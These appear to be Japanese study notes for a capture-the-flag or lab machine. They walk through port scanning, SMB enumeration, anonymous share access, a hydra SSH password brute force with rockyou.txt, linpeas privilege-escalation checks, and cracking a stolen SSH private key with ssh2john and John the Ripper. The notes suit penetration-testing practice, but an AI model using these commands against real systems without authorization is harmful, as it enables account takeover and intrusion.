ポート確認
nmap -sV -oN nmap.log 10.48.135.231


隠しファイルの探索
gobuster dir -u http://10.48.135.231 -w /usr/share/wordlists/dirb/common.txt
Status: 403 権限がない


SMBの情報収集
enum4linux -a 10.48.135.231


SMBクライアントで共有フォルダにアクセス
-N オプションはパスワードなしで接続するためのものです。共有フォルダの名前はenum4linuxの結果から確認してください。
smbclient //10.48.135.231/ShareName -N


smbからファイルをゲットする方法
get ファイル名


gunzip ファイル名.gz
gzipコマンドはgzip形式で圧縮されたファイルを解凍するためのコマンドです。ファイル名.gzは解凍したいファイルの名前を指定してください。解凍後、元のファイルが生成されます。


ブルートフォース
hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://10.48.135.231


SSHでログイン
ssh user@X.X.X.X
パスワード: 123456


whoami
ユーザー名を表示するコマンドです。現在ログインしているユーザーの
名前を確認するために使用されます。


ls -l
ファイルやディレクトリの詳細な情報を表示するコマンドです。-lオプションはロングフォーマットで表示するためのもので、ファイルのアクセス権、所有者、グループ、サイズ、最終更新日時などの情報が表示されます。
権限がrwxr-xr-xの場合、所有者は読み取り、書き込み、実行の権限を持ち、グループとその他のユーザーは読み取りと実行の権限を持ちます。つまり、所有者はファイルを編集できますが、グループとその他のユーザーはファイルを編集できません。


linpeas
linpeasはLinuxシステムのローカル特権昇格の脆弱性を検査するためのスクリプトです。システムの構成や設定を分析し、潜在的なセキュリティホールを特定します。これにより、攻撃者が特権を昇格させる可能性のある脆弱なポイントを見つけることができます。


scp
scpはSecure Copy Protocolの略で、リモートホストとの間でファイルを安全に転送するためのコマンドです。scpを使用すると、SSHプロトコルを利用してファイルを暗号化して転送することができます。以下はscpの基本的な使用方法です。


id_rsa
id_rsaはSSHの秘密鍵ファイルの名前です。SSHは公開鍵暗号方式を使用しており、id_rsaは秘密鍵として機能します。秘密鍵は厳重に保護する必要があり、他人に知られると不正アクセスのリスクがあります。
kaliに持っていき
chmod 600 id_rsa
ssh -i id_rsa user@X.X.X.X


john the ripper
john --wordlist=/usr/share/wordlists/rockyou.txt --format=ssh id_rsa


ssh2john kay_rsa > hash
kay_rsaはSSHの秘密鍵ファイルの名前です。ssh2johnはJohn the Ripperというパスワードクラッキングツールの一部で、SSHの秘密鍵をJohn the Ripperが処理できる形式に変換するためのコマンドです。hashは変換されたハッシュを保存するファイルの名前です。このコマンドを実行すると、kay_rsaファイルからハッシュが生成され、hashファイルに保存されます。その後、John the Ripperを使用してこのハッシュを解析し、パスワードを見つけることができます。   

john hash --wordlist=/usr/share/wordlists/rockyou.txt --format=ssh
変換したハッシュをJohn the Ripperで解析するコマンドです。hashはssh2johnで生成されたハッシュファイルの名前です。--wordlistオプションは使用する単語リストを指定し、--format=sshはハッシュの形式がSSHのものであることを示しています。このコマンドを実行すると、John the Ripperがhashファイルに含まれるハッシュを解析し、rockyou.txtの単語リストを使用してパスワードを見つけようとします。
